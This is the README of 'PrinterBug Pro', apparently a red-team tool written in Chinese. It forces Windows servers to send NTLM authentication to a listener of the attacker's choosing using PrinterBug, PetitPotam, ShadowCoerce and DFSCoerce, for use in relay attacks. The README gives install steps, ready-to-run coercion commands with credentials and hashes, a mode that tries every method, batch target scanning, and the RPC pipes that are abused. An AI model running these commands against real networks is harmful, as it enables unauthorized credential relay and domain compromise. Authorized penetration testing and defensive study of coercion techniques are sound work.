# PrinterBug Pro
[English](https://github.com/RedteamNotes/Printerbug-Pro/blob/main/README.md) | [中文](https://github.com/RedteamNotes/Printerbug-Pro/blob/main/assets/README_zh.md) | [Français](https://github.com/RedteamNotes/Printerbug-Pro/blob/main/assets/README_fr.md)
Windows SMB NTLM认证强制触发工具，通过MS-RPRN/MS-EFSR/MS-FSRVP/MS-DFSNM RPC协议触发目标向监听地址发起NTLM认证，用于NTLM中继场景，完全兼容原版printerbug.py参数。

## 特性
- 100%兼容原版printerbug.py所有参数，可直接替换使用
- 内置4种强制认证方法：MS-RPRN（经典PrinterBug，默认）、MS-EFSR（PetitPotam）、MS-FSRVP（ShadowCoerce）、MS-DFSNM（DFSCoerce）
- 自动模式：依次尝试所有可用方法
- 自动检测SMB签名状态，提示是否可进行NTLM中继
- 支持批量目标扫描，显示进度
- 修复原版所有bug：新版impacket日志报错、`-no-ping`逻辑反转、权限判断错误
- 无额外依赖，单文件脚本
## 安装
```bash
git clone https://github.com/RedteamNotes/Printerbug-Pro.git
cd Printerbug-Pro
pip3 install impacket
chmod +x printerbug_pro.py
```
## 使用方法
### 语法
```bash
python3 printerbug_pro.py [[域名/]用户名[:密码]@]<目标地址> <监听地址> [选项]
```
### 参数说明
| 参数 | 说明 |
|------|------|
| target | 目标地址，格式：`[[域名/]用户名[:密码]@]<IP/主机名>` |
| listener | 接收NTLM认证的监听IP/主机名 |
| --verbose | 开启调试输出 |
| --method | 强制认证方法：`printerbug`(默认)、`petitpotam`、`shadowcoerce`、`dfscoerce`、`all` |
| -target-file | 目标列表文件（每行一个目标，`#`开头的行自动忽略） |
| -port | SMB端口，默认445 |
| -timeout | 连接超时时间（秒），默认3秒 |
| -no-ping | 跳过连接前的TCP ping检测 |
| -hashes | NTLM哈希认证，格式`LMHASH:NTHASH` |
| -no-pass | 不提示输入密码，用于匿名访问 |
| -k | 使用Kerberos认证 |
| -dc-ip | 域控制器IP地址 |
| -target-ip | 使用主机名时指定目标IP |
### 使用示例
```bash
# 经典PrinterBug
python3 printerbug_pro.py domain/user:Password123@10.10.10.10 10.10.10.20
# 使用PetitPotam方法
python3 printerbug_pro.py domain/user:Password123@10.10.10.10 10.10.10.20 --method petitpotam
# 自动尝试所有方法
python3 printerbug_pro.py domain/user:Password123@10.10.10.10 10.10.10.20 --method all
# 匿名触发
python3 printerbug_pro.py 'DOMAIN\'@10.10.10.10 10.10.10.20 --no-pass
# NTLM哈希认证
python3 printerbug_pro.py domain/user@10.10.10.10 10.10.10.20 -hashes :31d6cfe0d16ae931b73c59d7e0c089c0
# 批量扫描
python3 printerbug_pro.py ''@$placeholder 10.10.10.20 -target-file targets.txt --no-pass --method all
```
## 支持的方法
| 方法 | 协议 | 管道 | 说明 |
|------|------|------|------|
| PrinterBug | MS-RPRN | `\pipe\spoolss` | 经典打印服务漏洞，打印服务运行时可用 |
| PetitPotam | MS-EFSR | `\pipe\efsrpc` | 适用于大多数Windows版本，即使打印服务禁用也可使用 |
| ShadowCoerce | MS-FSRVP | `\pipe\FssagentRpc` | 适用于开启VSS服务的服务器版本 |
| DFSCoerce | MS-DFSNM | `\pipe\netdfs` | 适用于域控和开启DFS服务的服务器 |
## 免责声明
本工具仅用于授权的安全测试和红队操作，未经授权访问计算机系统属于违法行为，作者不对任何滥用或造成的损失负责。
## 致谢
- 原版PrinterBug作者：Dirk-jan Mollema (@_dirkjan)
- PetitPotam作者：@topotam77
- ShadowCoerce作者：@ShutdownRepo
- DFSCoerce作者：@filip_dragovic